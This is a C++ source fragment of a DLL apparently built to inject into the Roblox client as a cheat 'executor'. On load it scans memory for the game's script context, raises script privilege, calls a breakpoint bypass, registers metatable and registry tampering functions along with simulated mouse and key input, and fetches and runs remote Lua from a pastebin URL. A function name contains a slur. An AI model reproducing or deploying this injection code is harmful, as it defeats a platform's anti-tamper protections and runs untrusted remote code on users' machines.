		lua_setfield(L, -2, name);
		idx++;
	}
	return 1;
}

int error(lua_State* thread) {
	std::string errorstr = lua_tostring(thread, -1);
	int type = lua_tonumber(thread, -2);
	std::string finalerror = "warn('"; finalerror = finalerror + errorstr; finalerror = finalerror + "')";
	luaL_dostring(thread, finalerror.c_str());
	return 1;
}

int newcclosure(lua_State* L) {
	lua_pushvalue(L, 1);
	return 1;
}

int getsenv(lua_State* LS) {
	lua_pushvalue(LS, LUA_ENVIRONINDEX);
	Wrap(RLS, LS, -1);
	return 1;
}

int ImperiousSoRetardedHisErrorFunctionBAIT() {
	//if (AUTH()) {

	//InitUploadCheckHook();
//	ConsoleBypass("Lua Wrapper By Imperious");
	LS = lua_open();
	ScriptContext = Memory::Scan();

	int v48 = 0;
	int v39 = ScriptContext;
	RLS = *(DWORD*)(v39 + 56 * v48 + 172) - (v39 + 56 * v48 + 172);

	printf("Scanned");

	Level(RLS, 6);
	BypassBreakpoints();
	luaL_openlibs(LS);
	WrapRBX("printidentity");
	WrapRBX("game");
	WrapRBX("Game");
	WrapRBX("workspace");
	WrapRBX("Workspace");
	WrapRBX("Axes");
	WrapRBX("BrickColor");
	WrapRBX("CFrame");
	WrapRBX("Color3");
	WrapRBX("ColorSequence");
	WrapRBX("ColorSequenceKeypoint");
	WrapRBX("NumberRange");
	WrapRBX("NumberSequence");
	WrapRBX("NumberSequenceKeypoint");
	WrapRBX("PhysicalProperties");
	WrapRBX("Ray");
	WrapRBX("Rect");
	WrapRBX("Region3");
	WrapRBX("Region3int16");
	WrapRBX("TweenInfo");
	WrapRBX("UDim");
	WrapRBX("UDim2");
	WrapRBX("Vector2");
	WrapRBX("Vector2int16");
	WrapRBX("Vector3");
	WrapRBX("Vector3int16");
	WrapRBX("Enum");
	WrapRBX("Faces");
	WrapRBX("Instance");
	WrapRBX("math");
	WrapRBX("warn");
	WrapRBX("typeof");
	WrapRBX("type");
	WrapRBX("spawn");
	WrapRBX("Spawn");
	WrapRBX("print");
	WrapRBX("printidentity");
	WrapRBX("ypcall");
	WrapRBX("Wait");
	WrapRBX("wait");
	WrapRBX("delay");
	WrapRBX("Delay");
	WrapRBX("tick");
	WrapRBX("LoadLibrary");
	lua_register(LS, "DLS", httpgetimpl);
	lua_register(LS, "loadstring", custom_loadstring);
	lua_register(LS, "EQ", EQ);
	lua_register(LS, "GC", GC);
	lua_register(LS, "getrawmetatable", getRawMetaTable);
	luaL_dostring(LS, "function GetObjects(assetId) local obj = game:GetService(\"InsertService\"):LoadLocalAsset(assetId) return { obj }; end");
	luaL_dostring(LS, "os.execute = nil; os.remove = nil; os.rename = nil; os.tmpname = nil; io = nil");
	luaL_dostring(LS, "function HttpGet(url, ...) return DownloadString(url) end");
	lua_register(LS, "DownloadString", custom_httpget);
	lua_register(LS, "mousemoverel", MouseMoveRelative);
	lua_register(LS, "MouseMoveRel", MouseMoveRelative);
	lua_register(LS, "mousemoverelative", MouseMoveRelative);
	lua_register(LS, "MouseMoveRelative", MouseMoveRelative);
	lua_register(LS, "MouseButton1Click", Mouse1Click);
	lua_register(LS, "MouseButton1Press", Mouse1Down);
	lua_register(LS, "MouseButton1Release", Mouse1Up);
	lua_register(LS, "MouseButton2Click", Mouse2Click);
	lua_register(LS, "MouseButton2Press", Mouse2Down);
	lua_register(LS, "MouseButton2Release", Mouse2Up);
	lua_register(LS, "MouseButton1Down", Mouse1Down);
	lua_register(LS, "MouseButton1Up", Mouse1Up);
	lua_register(LS, "MouseButton2Down", Mouse2Down);
	lua_register(LS, "MouseButton2Up", Mouse2Up);
	lua_register(LS, "MouseButton1Down", MouseButton1Down);
	lua_register(LS, "MouseButton2Down", MouseButton2Down);
	lua_register(LS, "MouseButton1Up", MouseButton1Up);
	lua_register(LS, "MouseButton2Up", MouseButton2Up);
	lua_register(LS, "getobjects", Custom_GetObjects);
	lua_register(LS, "keypress", KeyPress);
	lua_register(LS, "keyrelease", KeyRelease);
	lua_register(LS, "keytap", KeyTap);
	lua_register(LS, "KeyPress", KeyPress);
	lua_register(LS, "KeyRelease", KeyRelease);
	lua_register(LS, "KeyTap", KeyTap);
	lua_register(LS, "getreg", getreg);
	lua_register(LS, "getrenv", getrenv);
	lua_register(LS, "getgenv", getgenv);
	lua_register(LS, "setreadonly", setreadonly);
	lua_register(LS, "WriteLog", outputtoconsole);
	lua_register(LS, "copystring", fn_toclipboard);
	lua_register(LS, "setclipboard", fn_toclipboard);
	lua_register(LS, "custom_copyclipboard", fn_toclipboard);
	lua_register(LS, "fn_toclipboard", fn_toclipboard);
	lua_register(LS, "toclipboard", fn_toclipboard);
	lua_register(LS, "toclipboard", fn_toclipboard);
	lua_register(LS, "debug.setmetatable", setrawmetatable_impl);
	lua_register(LS, "debug.getmetatable", getRawMetaTable);
	lua_register(LS, "debug.getregistry", Debug_GetRegistry);
	lua_register(LS, "debug.getupvalue", Debug_getupvalue);
	lua_register(LS, "debug.setupvalue", Debug_setupvalue);
	lua_register(LS, "writefile", luawritefile);
	lua_register(LS, "getrawmetatable", getRawMetaTable);
	lua_register(LS, "setrawmetatable", setrawmetatable_impl);
	lua_register(LS, "shit", getupvalues);
	//lua_register(LS, "debug.setlocal", Debug_setlocal);
	lua_register(LS, "debug.getinfo", Debug_getinfo);
	lua_register(LS, "debug.setfenv", Debug_setfenv);
	lua_register(LS, "debug.traceback", Debug_traceback);
	lua_register(LS, "getsenv", getsenv);
	lua_setglobal(LS, "_G");
	lua_register(LS, "require", custom_require);
	lua_register(LS, "error", error);
	lua_register(LS, "_PROXO", _PROXO);
	//Functions::RegisterDebugFunctions(LS);
	CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)cmdpipe, NULL, NULL, NULL);
	CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)luacpipe, NULL, NULL, NULL);
	CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)luapipe, NULL, NULL, NULL);
	//	MessageBoxA(NULL, "Ready to Use!", "Ready to Use!", NULL);
	luaL_dostring(LS, "function setreadonly() end isreadonly = function() return false end makewritable = setreadonly setwritable = setreadonly ");
	luaL_dostring(LS, "function GetObjects(assetId) local obj = game:GetService(\"InsertService\"):LoadLocalAsset(assetId) return { obj }; end");
	luaL_dostring(LS, "function HttpGet(url, other) return DLS(url) end");
	luaL_dostring(LS, download_url("https://pastebin.com/raw/CenCCYqb").c_str());
	luaL_dostring(LS, "function GetObjects(assetId)\r\n    local obj = game:GetService(\"InsertService\"):LoadLocalAsset(assetId)\r\n    return { obj };\r\nend\r\n\r\nfunction ensure(obj)\r\n    for _,child in pairs(obj:GetChildren()) do\r\n        if (child.ClassName == \"LocalScript\") then\r\n            loadstring(child.Source)();\r\n            ensure(child);\r\n        else\r\n            ensure(child);\r\n        end\r\n    end\r\nend\r\n\r\n");
	luaL_dostring(LS, "function GetObjects(assetId) local obj = game:GetService(\"InsertService\"):LoadLocalAsset(assetId) return { obj }; end");
	luaL_dostring(LS, "local gmt = getrawmetatable(game)\nlocal old = gmt.__index\n\ngmt.__index = function(self, key)\nif key == \"GetObjects\" or key == \"getobjects\" then\nreturn function(self, id) return GetObjects(id) end\nend\nif key == \"HttpGet\" or key == \"HttpGetAsync\" then\nreturn function(self, url, async) return DLS(url) end\nend\nreturn old(self, key)\nend");
	MessageBoxA(NULL, "Confiscation Api!", "Injected (0.1s)!", NULL);
	return 1;

	//}
	//else {
	//system("start https://wearedevs.net/d/Yoink%20Executor");
//}
}

BOOL APIENTRY DllMain(HMODULE Module, DWORD Reason, void* Reserved)
{
	if (Reason == 1) {
		DisableThreadLibraryCalls(Module);
		CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)ImperiousSoRetardedHisErrorFunctionBAIT, NULL, NULL, NULL);
	}
	return TRUE;
}